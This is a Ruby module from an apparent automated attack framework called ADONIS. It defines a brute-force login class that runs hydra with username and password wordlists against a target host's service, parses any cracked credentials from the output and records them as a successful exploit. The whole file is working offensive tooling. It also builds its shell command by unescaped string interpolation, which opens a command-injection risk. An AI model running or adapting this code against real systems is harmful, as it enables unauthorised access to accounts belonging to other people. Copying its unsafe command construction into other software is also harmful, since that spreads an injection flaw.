#encoding: utf-8

require 'thread'

module ADONIS
module EXPLOIT

class BruteFourceBase < Base

    def brute_fource_init id, service_name, father_node_name
        name = "#{service_name}_brute_fource_login"
        desc = "#{service_name}暴力破解"
        exploit_init(id, name, father_node_name, 50,desc)
	@service = service_name
        set_default_cmd
    end

    def set_default_cmd
        @cmd = File.join(::ADONIS::BinDir, "hydra")
        @username_file = File.join(::ADONIS::DataDir, "local_wordlists/#{@service}_user.txt")
        @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/#{@service}_pwd.txt")
        unless File.exist?(@username_file)
            @username_file = File.join(::ADONIS::DataDir, "local_wordlists/default_user.txt")
        end
        unless File.exist?(@passwd_file)
            @passwd_file = File.join(::ADONIS::DataDir, "local_wordlists/default_pwd.txt")
        end
    end

    def exploit_func host
        command = "#{@cmd} -L #{@username_file} -P #{@passwd_file} #{@args} #{host.ip} #{@service}"
        ::ADONIS.exploit_logger.info("#{self.class}, exploit_func #{id}: #{host.ip} by command: #{command}" )
        out = `#{command}`
        password_list = ::ADONIS::EXPLOIT::Hydra.check out
        
        if password_list.nil? 
            return exploit_failed out
        else
            return exploit_success out, password_list.to_json
        end
    end

end

class Hydra
    def self.check out
        if out =~ /(\d) valid password found/ and $1.to_i != 0
            if out =~ /host:\s*\S*\s*login:\s*(\S*)\s*password:\s*(\S*)\n/
                return [$1, $2]
            end
        end

        return nil
    end
end

end
end

